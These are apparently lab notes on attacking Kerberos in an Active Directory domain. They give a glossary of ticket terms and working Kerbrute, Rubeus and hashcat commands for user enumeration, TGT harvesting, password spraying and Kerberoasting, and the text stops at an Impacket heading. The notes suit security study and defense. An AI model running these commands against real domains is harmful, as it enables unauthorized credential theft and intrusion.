# Active Directory

## Kerberos

Kerberos is the default authentication service for Microsoft Windows domains. It is intended to be more "secure" than NTLM by using third party ticket authorization as well as stronger encryption. Even though NTLM has a lot more attack vectors to choose from Kerberos still has a handful of underlying vulnerabilities just like NTLM that we can use to our advantage.

Common Terminology -  

Ticket Granting Ticket (TGT) - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.
Key Distribution Center (KDC) - The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.
Authentication Service (AS) - The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.
Ticket Granting Service (TGS) - The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.
Service Principal Name (SPN) - A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.
KDC Long Term Secret Key (KDC LT Key) - The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.
Client Long Term Secret Key (Client LT Key) - The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.
Service Long Term Secret Key (Service LT Key) - The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.
Session Key - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.
Privilege Attribute Certificate (PAC) - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.

### Enumeration w Kerbrute 

You need to add the DNS domain name with the machine IP to /etc/hosts `10.10.253.78  CONTROLLER.local`

1. Link: (Kerbrute GitHub)[https://github.com/ropnop/kerbrute/releases]
2. rename kerbrute_linux_amd64 to kerbrute
3. make it executable `chmod +x kerbrute`

### Enumerate Users w Kerbrute

1. You need a wordlist for Users -> (User.txt)[https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/User.txt]
2. 
```console
$ ./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
```

### Harvesting/ Bruteforce Tickets w Rubeus

**Harvesting:**
You have to run it on attacker machine!
Link: (Rubeus GitHub)[https://github.com/GhostPack/Rubeus]

```console
$ Rubeus.exe harvest /interval:30

 - This command tells Rubeus to harvest for TGTs every 30 seconds
```
**Bruteforce**
Add the domain controller to windows hosts file `echo 10.10.253.78 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts`

```console
$ Rubeus.exe brute /password:Password1 /noticket

- This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user
```

### Kerberoasting w Rubeus & Impacket

Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password.

**Method1: Rubeus**
```console
$ Rubeus.exe kerberoast 

- This will dump the Kerberos hash of any kerberoastable users

```

Copy the hash to your machine and crack it with hashcat

```console
$ hashcat -m 13100 -a 0 hash.txt wordlist.txt
```

**Method2: Impacket**